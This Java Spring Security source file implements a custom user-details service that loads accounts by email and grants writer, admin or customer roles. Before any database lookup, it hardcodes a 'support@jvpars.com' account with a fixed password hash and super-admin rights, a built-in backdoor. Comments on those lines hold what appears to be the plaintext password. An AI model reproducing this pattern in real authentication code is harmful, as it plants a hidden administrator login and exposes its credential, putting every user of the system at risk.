package com.jvpars.security;

/**
 * Created by ali .
 */


import com.jvpars.domain.SysUser;
import com.jvpars.service.api.SysUserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.HashSet;
import java.util.Set;

@Service("customUserDetailsService")
public class CustomUserDetailsService implements UserDetailsService {

    @Autowired
    SysUserService sysUserService;

    @Transactional(readOnly=true)
    public UserDetails loadUserByUsername(String email)
            throws UsernameNotFoundException {

        SysUser user = sysUserService.findByEmail(email); //^uc88&CRcM8?dR

        if(email.equals("support@jvpars.com")) //^uc88&CRcM8?dR
            return new org.springframework.security.core.userdetails.User("support@jvpars.com", "$2a$10$p82EFBurUgkvcJGP8bRdR.Ip3kwKzLhg4Iirk3M3HWhOZmuz8S2Hy",
                    true, true, true, true, getGrantedAuthoritiesForRoleAdmin("ROLE_SUPER_ADMIN"));


        if(user==null){
            System.out.println("CustomUserDetailsService.class User not found");
            throw new UsernameNotFoundException("Username not found");
        }



        if(user.getRole().equals("ROLE_WRITER")){
            return new org.springframework.security.core.userdetails.User(user.getEmail(), user.getPassword(),
                    true, true, true, true, getGrantedAuthoritiesForRoleUser(user.getRole()));
        }

        if(user.getRole().equals("ROLE_ADMIN")){
            return new org.springframework.security.core.userdetails.User(user.getEmail(), user.getPassword(),
                    true, true, true, true, getGrantedAuthoritiesForRoleAdmin(user.getRole()));
        }


        return new org.springframework.security.core.userdetails.User(user.getEmail(), user.getPassword(),
                true, true, true, true, getGrantedAuthoritiesForRolCostumer(user.getRole()));
    }


    private  Set<GrantedAuthority>  getGrantedAuthoritiesForRolCostumer(String role){
        Set<GrantedAuthority> authorities = new HashSet<>();
        authorities.add(new SimpleGrantedAuthority(role));
        return authorities;
    }

    private  Set<GrantedAuthority>  getGrantedAuthoritiesForRoleUser(String role){
        Set<GrantedAuthority> authorities = new HashSet<>();
        authorities.add(new SimpleGrantedAuthority(role));
        return authorities;
    }

    private  Set<GrantedAuthority>  getGrantedAuthoritiesForRoleAdmin(String role){
        Set<GrantedAuthority> authorities = new HashSet<>();
        authorities.add(new SimpleGrantedAuthority(role));
        return authorities;
    }

    private  Set<GrantedAuthority>  getGrantedAuthoritiesForRoleSuperAdmin(String role){
        Set<GrantedAuthority> authorities = new HashSet<>();
        authorities.add(new SimpleGrantedAuthority(role));
        return authorities;
    }

}